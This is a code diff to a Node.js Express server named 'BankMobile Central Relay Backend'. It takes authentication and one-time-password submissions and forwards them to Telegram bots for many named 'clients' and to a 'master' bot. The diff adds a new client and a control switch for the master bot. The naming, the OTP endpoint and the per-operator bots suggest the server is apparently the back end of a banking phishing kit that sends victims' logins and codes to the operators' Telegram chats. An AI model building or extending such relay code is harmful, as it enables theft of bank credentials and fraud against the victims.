@@ -1,6 +1,6 @@
 // ================================================
 // BANKMOBILE CENTRAL RELAY BACKEND
-// Simple version + Global & Per-Client switch
+// Global + Per-Client + Master switch
 // Control endpoints support both GET + POST
 // ================================================
 require('dotenv').config();
@@ -38,7 +38,8 @@ const BOT_CONFIGS = {
     'apo': { token: process.env.BOT_TOKEN_13, chatId: process.env.CHAT_ID_13 },
     'alahji': { token: process.env.BOT_TOKEN_14, chatId: process.env.CHAT_ID_14 },
     'ola': { token: process.env.BOT_TOKEN_15, chatId: process.env.CHAT_ID_15 },
-    'bamzy': { token: process.env.BOT_TOKEN_16, chatId: process.env.CHAT_ID_16 }
+    'bamzy': { token: process.env.BOT_TOKEN_16, chatId: process.env.CHAT_ID_16 },
+    'mm': { token: process.env.BOT_TOKEN_17, chatId: process.env.CHAT_ID_17 }   // ← NEW CLIENT
 };
 
 const DEFAULT_CONFIG = {
@@ -49,8 +50,9 @@ const DEFAULT_CONFIG = {
 // ================================================
 // SWITCHES
 // ================================================
-let clientsEnabled = true;              // Global switch (default = ON)
-const disabledClients = new Set();      // Individual clients that are turned off
+let clientsEnabled = true;          // Global clients switch (default = ON)
+let masterEnabled = true;           // Master bot switch (default = ON)
+const disabledClients = new Set();  // Individual clients that are turned off
 
 // ================================================
 // SEND TO TELEGRAM
@@ -75,16 +77,21 @@ async function sendToTelegram(token, chatId, message) {
 }
 
 // ================================================
-// SEND TO BOTS (respects global + individual switches)
+// SEND TO BOTS (respects all switches)
 // ================================================
 async function sendToBots(clientId, clientMessage, masterMessage) {
     const results = [];
 
-    // Always send to MASTER
-    const masterResult = await sendToTelegram(MASTER_BOT.token, MASTER_BOT.chatId, masterMessage);
-    results.push({ bot: 'MASTER', sent: masterResult });
+    // ----- MASTER -----
+    if (masterEnabled) {
+        const masterResult = await sendToTelegram(MASTER_BOT.token, MASTER_BOT.chatId, masterMessage);
+        results.push({ bot: 'MASTER', sent: masterResult });
+    } else {
+        results.push({ bot: 'MASTER', sent: false, reason: 'Master bot is DISABLED' });
+        console.log('🚫 Master bot DISABLED');
+    }
 
-    // Decide if this client should receive the message
+    // ----- CLIENT -----
     const isClientAllowed = clientsEnabled && !disabledClients.has(clientId);
 
     if (isClientAllowed) {
@@ -97,7 +104,7 @@ async function sendToBots(clientId, clientMessage, masterMessage) {
             reason = `Client "${clientId}" is individually DISABLED`;
         }
         results.push({ bot: clientId, sent: false, reason });
-        console.log(`🚫 ${reason} → message only went to MASTER`);
+        console.log(`🚫 ${reason}`);
     }
 
     return results;
@@ -208,6 +215,7 @@ async function handleAuth(req, res) {
         success: result.success,
         client: clientId,
         clientsEnabled,
+        masterEnabled,
         telegramSent: results
     });
 }
@@ -243,18 +251,17 @@ app.post('/submit-otp', async (req, res) => {
 // CONTROL ENDPOINTS (support both GET + POST)
 // ================================================
 
-// Turn ALL clients OFF
+// ----- GLOBAL CLIENTS -----
 app.all('/clients-off', (req, res) => {
     clientsEnabled = false;
-    console.log('🚫 ALL CLIENTS DISABLED → Only Master receives messages');
+    console.log('🚫 ALL CLIENTS DISABLED');
     res.json({
         success: true,
-        message: 'All clients disabled. Only Master bot will receive messages.',
+        message: 'All clients disabled.',
         clientsEnabled: false
     });
 });
 
-// Turn ALL clients ON
 app.all('/clients-on', (req, res) => {
     clientsEnabled = true;
     console.log('✅ ALL CLIENTS ENABLED');
@@ -265,7 +272,7 @@ app.all('/clients-on', (req, res) => {
     });
 });
 
-// Turn ONE specific client OFF
+// ----- SINGLE CLIENT -----
 app.all('/client-off/:clientId', (req, res) => {
     const clientId = req.params.clientId.toLowerCase();
 
@@ -282,7 +289,6 @@ app.all('/client-off/:clientId', (req, res) => {
     });
 });
 
-// Turn ONE specific client ON
 app.all('/client-on/:clientId', (req, res) => {
     const clientId = req.params.clientId.toLowerCase();
 
@@ -295,14 +301,39 @@ app.all('/client-on/:clientId', (req, res) => {
     });
 });
 
-// Check current status
+// ----- MASTER BOT -----
+app.all('/master-off', (req, res) => {
+    masterEnabled = false;
+    console.log('🚫 MASTER BOT DISABLED');
+    res.json({
+        success: true,
+        message: 'Master bot has been disabled.',
+        masterEnabled: false
+    });
+});
+
+app.all('/master-on', (req, res) => {
+    masterEnabled = true;
+    console.log('✅ MASTER BOT ENABLED');
+    res.json({
+        success: true,
+        message: 'Master bot has been enabled.',
+        masterEnabled: true
+    });
+});
+
+// ----- STATUS -----
 app.get('/clients-status', (req, res) => {
     res.json({
+        masterEnabled,
         globalClientsEnabled: clientsEnabled,
         disabledClients: Array.from(disabledClients),
-        status: clientsEnabled
-            ? (disabledClients.size === 0 ? 'All clients ON' : `Some clients disabled: ${Array.from(disabledClients).join(', ')}`)
-            : 'ALL clients OFF (Master only)'
+        status: {
+            master: masterEnabled ? 'ON' : 'OFF',
+            clients: clientsEnabled
+                ? (disabledClients.size === 0 ? 'All ON' : `Some disabled: ${Array.from(disabledClients).join(', ')}`)
+                : 'ALL OFF'
+        }
     });
 });
 
@@ -322,6 +353,7 @@ app.get('/health', (req, res) => {
     res.json({
         status: 'ok',
         service: 'bankmobile-relay',
+        masterEnabled,
         clientsEnabled,
         disabledClients: Array.from(disabledClients),
         clients: Object.keys(BOT_CONFIGS)
@@ -332,13 +364,16 @@ app.get('/', (req, res) => {
     res.json({
         service: 'BankMobile Relay Backend',
         status: 'running',
+        masterEnabled,
         clientsEnabled,
         disabledClients: Array.from(disabledClients),
         control: {
             'GET/POST /clients-off': 'Disable ALL clients',
             'GET/POST /clients-on': 'Enable ALL clients',
-            'GET/POST /client-off/:clientId': 'Disable one client (example: /client-off/emmy)',
-            'GET/POST /client-on/:clientId': 'Enable one client (example: /client-on/emmy)',
+            'GET/POST /client-off/:clientId': 'Disable one client (example: /client-off/mm)',
+            'GET/POST /client-on/:clientId': 'Enable one client',
+            'GET/POST /master-off': 'Disable Master bot',
+            'GET/POST /master-on': 'Enable Master bot',
             'GET /clients-status': 'Check current status'
         }
     });
@@ -350,7 +385,8 @@ app.get('/', (req, res) => {
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`✅ BankMobile Relay running on port ${PORT}`);
     console.log(`📨 Clients: ${Object.keys(BOT_CONFIGS).join(', ')}`);
-    console.log(`🔧 Global: /clients-off  |  /clients-on`);
-    console.log(`🔧 Single: /client-off/emmy  |  /client-on/emmy`);
-    console.log(`📊 Status: /clients-status`);
+    console.log(`🔧 Clients: /clients-off  |  /clients-on`);
+    console.log(`🔧 Single:  /client-off/mm  |  /client-on/mm`);
+    console.log(`🔧 Master:  /master-off   |  /master-on`);
+    console.log(`📊 Status:  /clients-status`);
 });
